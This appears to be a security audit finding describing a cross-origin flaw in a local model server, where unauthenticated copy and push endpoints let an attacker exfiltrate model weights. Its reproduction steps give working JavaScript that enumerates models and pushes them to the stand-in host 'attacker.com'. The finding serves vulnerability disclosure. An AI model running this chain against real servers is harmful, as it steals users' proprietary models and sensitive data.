Phase: 8
Sequence: 001
Slug: cross-origin-model-exfiltration
Verdict: VALID
Rationale: Confirmed two-step cross-origin chain (copy+push) enabling full model weight exfiltration with no authentication or destination restriction. Advocate found no blocking protection.
Severity-Original: HIGH
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-A/debate.md

## Summary

A cross-origin attacker can exfiltrate proprietary model weights by chaining two unauthenticated API calls: (1) POST /api/copy to create an alias of a victim's local model under an attacker-controlled registry hostname, and (2) POST /api/push to upload that model's blobs to the attacker's registry. Both endpoints pass CORS for hardcoded origins (vscode-webview://, app://, tauri://, file://*) and require no authentication. Model names (needed for the source parameter) can be enumerated via GET /api/tags.

## Location

- `server/routes.go:1698` -- POST /api/copy route (no auth)
- `server/routes.go:1446-1483` -- CopyHandler accepts arbitrary destination hostname
- `server/images.go:397-434` -- CopyModel creates manifest at attacker-controlled path
- `server/routes.go:1682` -- POST /api/push route (no auth)
- `server/images.go:511-547` -- PushModel uploads blobs to destination derived from model name
- `envconfig/config.go:100-106` -- AllowedOrigins includes vscode-webview://* and file://*
- `api/types.go:762-764` -- CopyRequest.Destination is an unrestricted string

## Attacker Control

Full control over:
- Destination hostname via CopyRequest.Destination field (e.g., "attacker.com/library/stolen:latest")
- Source model name (attacker enumerates installed models via GET /api/tags)
- Push timing (immediate after copy)

## Trust Boundary Crossed

Local model data (weights, system prompts, fine-tuning artifacts) exfiltrated from localhost to remote attacker-controlled registry. Cross-origin web context (VS Code extension webview, local HTML file) to server-side data exfiltration.

## Impact

- Full model weight exfiltration (multi-GB proprietary models)
- System prompt disclosure (may contain sensitive business logic or PII)
- Fine-tuning data exposure (training data embedded in model weights)
- Intellectual property theft

## Evidence

1. CopyHandler at `server/routes.go:1446`: accepts Source and Destination from JSON body
2. getExistingName at `server/routes.go:1031-1052`: does NOT error for unknown hosts, returns name as-is
3. CopyModel at `server/images.go:397-434`: creates manifest file at `manifests/<dst.Filepath()>`
4. PushModel at `server/images.go:511`: parses model name, BaseURL() resolves to attacker's host
5. No auth on /api/copy or /api/push
6. CORS passes for hardcoded origins at `envconfig/config.go:100-106`

## Reproduction Steps

1. Start Ollama with a model installed (e.g., `ollama pull llama3.2`)
2. From a vscode-webview:// context or local HTML file:
   ```javascript
   // Step 1: Enumerate models
   const tags = await fetch('http://localhost:11434/api/tags').then(r => r.json());
   const modelName = tags.models[0].name;

   // Step 2: Copy model to attacker registry
   await fetch('http://localhost:11434/api/copy', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({source: modelName, destination: 'attacker.com/library/stolen:latest'})
   });

   // Step 3: Push to attacker registry
   await fetch('http://localhost:11434/api/push', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({model: 'attacker.com/library/stolen:latest'})
   });
   ```
3. Verify model blobs are received at attacker.com registry
